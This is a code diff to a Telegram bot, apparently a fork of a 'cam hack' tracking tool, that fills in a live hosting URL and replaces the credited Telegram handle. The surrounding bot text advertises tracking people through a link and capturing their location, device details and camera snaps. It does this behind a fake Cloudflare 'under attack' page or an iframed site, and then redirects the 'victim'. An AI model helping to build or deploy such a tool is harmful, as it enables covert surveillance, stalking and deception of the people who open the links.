@@ -14,7 +14,7 @@ app.use(cors());
 app.set("view engine", "ejs");
 
 //Modify your URL here
-var hostURL="YOUR URL";
+var hostURL="https://camhackbot-mtq8.onrender.com";
 //TOGGLE for 1pt Proxy and Shorters
 var use1pt=true;
 
@@ -30,7 +30,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("@Unknown_Reason");
+res.redirect("@darkxraja");
 }
 
          
@@ -48,7 +48,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("@Unknown_Reason");
+res.redirect("@darkxraja");
 }
 
          
@@ -71,7 +71,7 @@ var m={
 reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
 };
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info @Unknown_Reason.`,m);
+bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info @darkxraja.`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
@@ -84,7 +84,7 @@ the url it will send you 2 links which you can use to track people.
 \n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
 \n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
 ( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\n 📥 Our Backup Channel: @Unknown_Reason
+\n\n 📥 Our Backup Channel: @darkxraja
 `);
 }
   
